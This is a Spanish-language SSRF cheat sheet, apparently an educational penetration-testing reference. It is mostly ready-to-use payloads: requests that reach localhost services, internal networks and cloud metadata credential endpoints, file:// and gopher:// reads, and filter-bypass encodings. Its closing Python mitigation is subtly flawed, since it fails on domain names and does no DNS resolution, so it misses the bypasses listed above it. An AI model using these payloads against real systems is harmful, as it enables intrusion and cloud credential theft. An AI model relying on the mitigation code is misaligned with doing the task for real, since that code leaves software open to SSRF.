# Server-Side Request Forgery (SSRF)

SSRF hace que el servidor haga peticiones HTTP a lugares no deseados:
red interna, servicios cloud, o el propio servidor (localhost).

OWASP: A10:2021 | CWE-918

## Como funciona

```
Atacante -> [Servidor web] -> Red interna / Cloud metadata / localhost
           el servidor hace
           la peticion por ti
```

## Deteccion

```bash
# Buscar parametros que reciben URLs
http://web.com/fetch?url=
http://web.com/proxy?target=
http://web.com/webhook?callback=
http://web.com/load?src=
http://web.com/download?path=

# Probar con servidor propio (Burp Collaborator o interactsh)
http://web.com/fetch?url=http://TU-SERVIDOR.com/test

# Si el servidor hace una peticion a tu URL -> SSRF confirmado
```

## Payloads SSRF

```bash
# Acceso a localhost
?url=http://localhost/admin
?url=http://127.0.0.1:22         -> SSH
?url=http://127.0.0.1:3306       -> MySQL
?url=http://127.0.0.1:6379       -> Redis
?url=http://0.0.0.0:80

# Red interna
?url=http://192.168.1.1          -> router
?url=http://10.0.0.1/admin       -> panel interno

# Cloud metadata (el mas critico en produccion)
?url=http://169.254.169.254/latest/meta-data/           -> AWS EC2
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://metadata.google.internal/computeMetadata/v1/ -> GCP
?url=http://169.254.169.254/metadata/instance           -> Azure

# Protocoles alternativos
?url=file:///etc/passwd          -> leer archivos locales
?url=dict://localhost:6379/info  -> Redis info
?url=gopher://localhost:6379/_INFO  -> Gopher para Redis
```

## Bypass de protecciones

```bash
# Si bloquean 127.0.0.1
?url=http://127.1               -> shorthand
?url=http://0177.0.0.1          -> octal
?url=http://0x7f000001          -> hexadecimal
?url=http://[::1]               -> IPv6
?url=http://spoofed.dominio.com -> DNS que resuelve a 127.0.0.1

# Si bloquean palabras "localhost"
?url=http://LOCALHOST
?url=http://LoCalHoSt
?url=http://localtest.me        -> dominio que resuelve a 127.0.0.1
```

## Mitigacion

```python
# Validar que la URL no apunta a IPs privadas
import ipaddress
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    ip = ipaddress.ip_address(parsed.hostname)
    return not (ip.is_private or ip.is_loopback or ip.is_link_local)
```
